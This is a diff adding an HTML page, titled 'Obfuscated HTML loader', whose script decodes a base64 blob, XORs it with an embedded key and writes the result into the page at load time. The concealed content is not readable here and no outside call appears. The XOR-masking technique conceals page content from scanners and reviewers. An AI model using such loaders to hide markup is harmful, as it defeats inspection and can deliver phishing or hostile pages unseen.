@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Obfuscated HTML loader</title>
+</head>
+<body>
+<script>
+(function() {
+  try {
+    var payload_b64 = "SGS5xZengX93FNlExC6FNEZ058WSpI54KUuUXMV2hXwMeKaChq6FYikdywCBO5M0QC61FWtRYCxRWZhfzD+fflRc+YqeroN4dwmaXsV2oWsbZu6GgKKPYncV1FiTaPslEGX9xZengX93FNlX0z+VORlosYKGooQhZ0aXQ4xk0X4VfKbR1vXqLCQVn1nXdpJ1FX/42NaogX5gC8XAPsJhOSV56ouAvo0sQUeYQtgmhXAbYquxkbiUZWpO29IhxdFIRSy3loSqjixnRZpD0mvTegF++YCav811YUiJEp9q3moEbeXbyOSEZXIX8RCBapVwAizoiZW4kzEmSppCxXTP6euAG8WwqpJnJH6eUoEbnncdeOSXnaWHLEFRi1HPJZh2GixpZWfrrWVgCcdD0TefORdg6paH9sJvcVuJVc8i3GARbfnHyvfPf3RIlQ6deZVwAjKBxdT3hGVyCZhcwCWCJFZv6peQ6d78m7Ja3xnZ0Vg9Ie+Xnb2FYiRkmlzWN4N8VEjug5Glk2kky3ujgQfCOUh/+4Sa64NgZVqIDYM1hGsGaeWR2bKFbXYLxQyOJYF4GjK3ypCiljIOCdsMxT+HORdg6paH9sJvZVufEp+0a7hUQf6JgKLNRWpNjkPVJIg5JmnvxaCugWEkepJd1DqQbR1j5cUWS3MsOFqLUc92knUVf/jY1qWFdHAEglXAJNMnSCP4lZWl3jArTZJGn1zNNhBl/dv+";
+    var key_hex = "740c8be5f4cbe00c0429fb30a156f119";
+
+    function hexToBytes(hex) {
+      var bytes = new Uint8Array(hex.length / 2);
+      for (var i = 0; i < bytes.length; i++) {
+        bytes[i] = parseInt(hex.substr(i*2, 2), 16);
+      }
+      return bytes;
+    }
+
+    function b64ToUint8Array(b64) {
+      var binary_string = atob(b64);
+      var len = binary_string.length;
+      var bytes = new Uint8Array(len);
+      for (var i = 0; i < len; i++) {
+        bytes[i] = binary_string.charCodeAt(i);
+      }
+      return bytes;
+    }
+
+    var data = b64ToUint8Array(payload_b64);
+    var key = hexToBytes(key_hex);
+
+    for (var i = 0; i < data.length; i++) {
+      data[i] = data[i] ^ key[i % key.length];
+    }
+
+    var decoder = new TextDecoder('utf-8');
+    var html = decoder.decode(data);
+
+    document.open();
+    document.write(html);
+    document.close();
+  } catch (e) {
+    document.body.innerHTML = "<pre style='white-space:pre-wrap;font-family:monospace;color:#900'>Error decoding obfuscated HTML:\n" + (e && e.stack ? e.stack : e) + "</pre>";
+    console.error("Obfuscated HTML loader error:", e);
+  }
+})();
+</script>
+</body>
+</html>
